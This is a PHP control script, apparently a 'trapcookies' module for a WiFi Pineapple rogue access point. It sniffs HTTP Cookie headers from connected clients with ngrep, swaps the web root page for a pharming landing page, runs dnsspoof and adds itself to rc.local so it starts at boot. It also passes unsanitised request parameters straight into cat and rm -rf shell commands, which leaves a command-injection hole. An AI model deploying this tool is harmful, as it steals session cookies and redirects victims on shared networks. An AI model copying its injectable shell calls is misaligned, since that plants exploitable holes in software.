<?php

require("trapcookies_vars.php");

if (isset($_GET['trapcookies']))
{
	if (isset($_GET['start']))
	{		
		$time = time();
		$full_cmd = "ngrep -q -d br-lan -W byline -t 'Cookie' 'tcp and port 80' > ".$module_path."log/output_".$time.".log";

		shell_exec("echo \"#!/bin/sh\n".$full_cmd."\" > ".$module_path."trapcookies.sh && chmod +x ".$module_path."trapcookies.sh &");
		$cmd = "echo ".$module_path."trapcookies.sh | at now";
	}
	if (isset($_GET['stop']))
	{
		$cmd = "killall ngrep";
	}
}

if (isset($_GET['landing']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'install':
				$cmd = "cp /www/index.php /www/index.php.backup && cp ".$module_path."index.php.pharm /www/index.php"; 
			break;
			
			case 'uninstall':
				$cmd = "cp /www/index.php.backup /www/index.php && rm -rf /www/index.php.backup"; 
			break;
		}
	}
}

if (isset($_GET['dnsspoof']))
{
	if (isset($_GET['start']))
	{		
		shell_exec("echo '' > /pineapple/logs/dnsspoof.log");
		$cmd = "echo /pineapple/dnsspoof/dnsspoof.sh | at now";
	}
	if (isset($_GET['stop']))
	{
		$cmd = "killall dnsspoof";
	}
}

if (isset($_GET['load']))
{
	if (isset($_GET['file']))
	{
		$log_date = date ("F d Y H:i:s", filemtime($module_path."log/".$_GET['file']));
		echo "trapcookies ".$_GET['file']." [".$log_date."]\n";

		$cmd = "cat ".$module_path."log/".$_GET['file'];
	}
}

if (isset($_GET['delete']))
{
	if (isset($_GET['file']))
	{
		if (isset($_GET['log']))
			$cmd = "rm -rf ".$module_path."log/".$_GET['file']."*";
	}
}

if (isset($_GET['boot']))
{
	if (isset($_GET['action']))
	{
		$action = $_GET['action'];
		
		switch($action)
		{
			case 'enable':
				exec("sed -i '/exit 0/d' /etc/rc.local"); 
				exec("echo ".$module_path."autostart.sh >> /etc/rc.local");
				exec("echo exit 0 >> /etc/rc.local");
			break;
			
			case 'disable': 
				exec("sed -i '/trapcookies\/autostart.sh/d' /etc/rc.local");
			break;
		}
	}	
}

if (isset($_GET['install'])) 
{
	if (isset($_GET['where']))
	{
		$where = $_GET['where'];
		
		switch($where)
		{
			case 'usb': 
				$cmd = "opkg update && opkg install ngrep --dest usb"; 
			break;
			
			case 'internal': 
				$cmd = "opkg update && opkg install ngrep"; 
			break;
		}
	}
}

if($cmd != "")
{
	$output = shell_exec($cmd);
	
	if($output != "")
		echo trim($output);	
}

?>